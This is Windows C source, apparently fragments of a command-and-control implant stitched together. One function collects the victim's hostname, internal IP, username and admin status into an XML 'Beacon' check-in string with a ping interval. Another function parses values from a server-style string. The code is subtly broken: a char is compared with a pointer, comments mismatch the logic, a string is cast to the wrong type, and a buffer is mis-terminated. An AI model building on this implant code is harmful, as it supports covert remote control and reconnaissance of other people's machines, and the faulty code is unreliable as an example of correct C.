#include <windows.h>
#include <stdio.h>

// Returns 0 on success, -1 on failure. keyPathOut must be at least MAX_PATH in size.
int get_key_path_from_exe_dir(const char* keyName, char* keyPathOut) {
    char exePath[MAX_PATH];
    DWORD len = GetModuleFileNameA(NULL, exePath, MAX_PATH);
    if (len == 0 || len == MAX_PATH) {
        return -1;
    }
    char* lastSlash = strrchr(exePath, '\\');
    if (!lastSlash) {
        return -1;
    }
    *(lastSlash + 1) = '\0';
    if (snprintf(keyPathOut, MAX_PATH, "%s%s", exePath, keyName) >= MAX_PATH) {
        return -1;
    }
    return 0;
}
#include <windows.h>
#include <stdio.h>
#include <lmaccess.h>
#include <lmerr.h>
#include <winsock.h>

HANDLE start_thread(LPTHREAD_START_ROUTINE function, LPVOID param) {
    DWORD thread_id;
    HANDLE handle = CreateThread(NULL, 0, function, param, 0, &thread_id);

    if (handle == NULL)
    {
        return NULL;
    }

    return handle;
}

void get_pc_infos(int update_interval, char* info_buffer) {
    char hostname[256];
    char *ip;
    char* current_user;
    size_t current_user_size = 0;
    struct hostent* host_entry;
    USER_INFO_1* info;
    int is_local_admin = 0;

    hostname[255] = '\n';
    
    if (gethostname(hostname, 256) == SOCKET_ERROR) {
        return;
    }


    host_entry = gethostbyname(hostname);

    if (host_entry == NULL) {
        return;
    }
    
    ip = inet_ntoa(*((struct in_addr*)host_entry->h_addr_list[0]));
    _dupenv_s(&current_user, &current_user_size, "USERNAME");

    if (current_user == NULL) {
        return;
    }

    is_local_admin = 0;
    if (NetUserGetInfo(NULL, (LPCWSTR)current_user, 1, (byte**)&info) == NERR_Success) {
        is_local_admin = info->usri1_priv == USER_PRIV_ADMIN;
    }

    int update_interval_size = 0;
    int tmp = update_interval;

    while (tmp > 0) {
        update_interval_size++;
        tmp = tmp / 10;
    }
    
    char* template = "info=<Beacon><HostName>%s</HostName><InternalIP>%s</InternalIP><CurrentUser>%s</CurrentUser><Admin>%d</Admin><PingInterval>%d</PingInterval></Beacon>";

    int infos_length = strlen(template) - 10 + strlen(current_user) + strlen(hostname) + strlen(ip) + 1 + update_interval_size;
    
    snprintf(info_buffer, infos_length +1, template, hostname, ip, current_user, is_local_admin, update_interval);
}

// Function to extract the integer value after 'L' from a string
int extractValue(const char* input, const char* pos) {
    const char* ptr = input;
    int value = 0;

    // Find the position of 'L' in the string
    while (*ptr != '\0' && *ptr != pos) {
        ptr++;
    }

    // If 'L' is found, parse the integer value after it
    if (*ptr == pos) {
        ptr++; // Move past 'L'
        while (*ptr >= '0' && *ptr <= '9') {
            value = value * 10 + (*ptr - '0');
            ptr++;
        }
    }

    return value;
}